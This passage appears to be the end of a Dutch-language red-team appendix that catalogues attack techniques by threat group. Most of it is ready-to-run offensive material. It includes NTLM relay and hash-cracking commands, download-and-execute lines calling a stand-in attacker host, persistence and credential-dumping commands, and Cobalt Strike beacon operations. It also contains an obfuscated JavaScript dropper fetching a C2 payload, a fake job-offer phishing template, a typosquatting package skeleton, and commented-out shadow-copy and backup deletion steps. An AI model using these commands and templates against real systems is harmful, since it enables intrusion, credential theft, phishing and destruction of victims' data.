# 5. User stuurt NetNTLMv2 hash
# 6. Hash kan offline worden gekraakt

# Output locatie
cat /usr/share/responder/logs/Responder-Session.log

# Crack captured hashes
hashcat -m 5600 captured_hashes.txt rockyou.txt
```

### NTLM Relay (Geen cracking nodig)
```bash
# ntlmrelayx voor directe relay
ntlmrelayx.py -tf targets.txt -smb2support

# Relay naar LDAP voor user creation
ntlmrelayx.py -t ldap://dc.corp.local --escalate-user attacker

# Relay naar AD CS voor certificates
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp --adcs

# Uitleg: NTLM relay gebruikt captured auth direct
# zonder te kraken. Veel sneller en effectiever.
```

## A.4 Volt Typhoon Technieken

### Living-off-the-Land Complete Reference
```powershell
# === RECONNAISSANCE ===
systeminfo
net user /domain
net group "Domain Admins" /domain
nltest /dclist:corp.local
dsquery * -filter "(objectClass=computer)" -attr *

# === FILE TRANSFER ===
certutil -urlcache -split -f http://attacker/file.exe file.exe
bitsadmin /transfer job http://attacker/file.exe C:\temp\file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker/file.exe','file.exe')"

# === EXECUTION ===
mshta http://attacker/payload.hta
rundll32 javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc")
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll
wmic process call create "cmd /c whoami"

# === PERSISTENCE ===
schtasks /create /tn "Update" /tr "C:\temp\beacon.exe" /sc hourly /ru SYSTEM
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d "C:\temp\beacon.exe"

# === LATERAL MOVEMENT ===
wmic /node:target process call create "cmd /c whoami"
winrs -r:target cmd

# === CREDENTIAL ACCESS ===
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" q q
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system

# Uitleg: Volt Typhoon gebruikt GEEN custom malware.
# Alleen native Windows tools. Zeer moeilijk te detecteren.
```

## A.5 Lazarus Technieken

### Fake Job Offer Campaign
```html
<!-- lazarus_job_email.html -->
<!DOCTYPE html>
<html>
<body style="font-family: Arial; max-width: 600px;">
<p>Dear {{FirstName}},</p>

<p>I came across your profile and was impressed by your experience 
as a {{CurrentTitle}}. I'm recruiting for {{FakeCompany}} and have 
an exciting opportunity.</p>

<p><strong>Position:</strong> Senior {{Role}}<br>
<strong>Salary:</strong> ${{SalaryLow}}K - ${{SalaryHigh}}K + equity<br>
<strong>Location:</strong> Remote</p>

<p>I've attached the job description. If interested, please review 
and complete the brief skills assessment.</p>

<p>Best regards,<br>
{{RecruiterName}}<br>
{{FakeCompany}}</p>

<p style="font-size:11px;color:#888;">
Attachment: Job_Description.docx (macro-enabled)
</p>
</body>
</html>

<!-- Uitleg: Lazarus target developers/engineers
     - Salary 30-50% boven markt
     - "Skills assessment" = malware
     - Focus op crypto/fintech bedrijven -->
```

### Supply Chain Attack (NPM/PyPI)
```bash
# Typosquatting package namen
# Origineel: lodash
# Malicious: 1odash, lodahs, lodash-utils

# Package.json met postinstall script
cat > package.json << 'EOF'
{
  "name": "1odash",
  "scripts": {
    "postinstall": "node install.js"
  }
}
EOF

# install.js bevat payload
# REDACTED: Actual payload code
```

## A.6 FIN7/Carbanak Technieken

### Cobalt Strike Operations
```bash
# Listener setup
Listeners > Add > HTTPS
Host: cdn.legit-looking.com
Port: 443
Profile: jquery-c2.profile (malleable)

# Beacon generation
Attacks > Packages > Windows Executable (S)
Output: beacon.exe

# Basic beacon commands
beacon> shell whoami
beacon> powershell Get-Process
beacon> upload C:\temp\mimikatz.exe
beacon> execute-assembly /tools/SharpHound.exe
beacon> dcsync corp.local CORP\krbtgt
beacon> jump psexec64 target.corp.local
beacon> spawn x64 SMB_LISTENER
beacon> connect target.corp.local 445
```

### JavaScript Dropper (FIN7 Style)
```javascript
// dropper.js - Obfuscated dropper
var _0x1234 = ['WScript', 'Shell', 'Run', 'powershell'];
var shell = new ActiveXObject(_0x1234[0] + '.' + _0x1234[1]);
var cmd = _0x1234[3] + ' -ep bypass -w hidden -c "IEX((New-Object Net.WebClient).DownloadString(\'http://c2/payload\'))"';
shell[_0x1234[2]](cmd, 0);

// Uitleg: FIN7 gebruikt JavaScript/VBS droppers
// Vaak in phishing emails of als bijlage
// Obfuscation om AV te bypassen
```

## A.7 ALPHV/BlackCat Technieken

### ESXi Ransomware Simulation
```bash
# SSH naar ESXi host
ssh root@esxi.corp.local

# Enumerate VMs
vim-cmd vmsvc/getallvms
esxcli vm process list

# Identify datastores
esxcli storage filesystem list

# SIMULATIE ONLY - Stop VMs (NIET UITVOEREN IN PRODUCTIE)
# for vmid in $(vim-cmd vmsvc/getallvms | awk '{print $1}' | tail -n +2); do
#     vim-cmd vmsvc/power.off $vmid
# done

# SIMULATIE ONLY - Ransomware zou encrypten:
# /vmfs/volumes/datastore1/*.vmdk
# /vmfs/volumes/datastore1/*.vmx
# /vmfs/volumes/datastore1/*.vmxf

# Document voor rapport
echo "=== ESXi Access Assessment ==="
echo "Host: $(hostname)"
echo "VMs: $(vim-cmd vmsvc/getallvms | wc -l)"
echo "Datastores: $(esxcli storage filesystem list | wc -l)"
echo "CONCLUSION: ESXi compromise would affect X VMs"
```

### Backup Destruction Assessment
```powershell
# Identify backup solutions
Get-Service | Where-Object {$_.DisplayName -match "Veeam|Backup|Commvault|Acronis|Veritas"}

# Check Veeam
Get-VBRBackup  # Als Veeam PowerShell module geladen

# Check Windows Server Backup
wbadmin get versions

# Shadow copies
vssadmin list shadows

# SIMULATIE - Document wat we ZOUDEN kunnen doen:
# 1. vssadmin delete shadows /all /quiet
# 2. wbadmin delete catalog -quiet
# 3. bcdedit /set {default} recoveryenabled No
# 4. Access backup server en delete backups

# Rapport output
Write-Output @"
=== Backup Assessment ===
Shadow Copies: Present/Absent
Backup Solution: [Name]
Backup Server Accessible: Yes/No
Offline Backups Found: Yes/No
CONCLUSION: Backup compromise [POSSIBLE/NOT POSSIBLE]
"@
```

---

# APPENDIX C: APT TECHNIQUE MAPPING

| APT Group | Primary Techniques | Tools |
|-----------|-------------------|-------|
| Scattered Spider | MFA fatigue, vishing, SIM swap | Evilginx, custom scripts |
| APT29 | HTML smuggling, OAuth abuse | EnvyScout, custom C2 |
| APT28 | Responder, VPN exploits | Responder, Mimikatz |
| Volt Typhoon | LOLBins, no malware | Native Windows tools |
| Lazarus | Fake jobs, supply chain | Custom malware |
| FIN7 | Cobalt Strike, JS droppers | Cobalt Strike |
| ALPHV | ESXi, backup destruction | Rust ransomware |

---

**EINDE ADDENDUM**
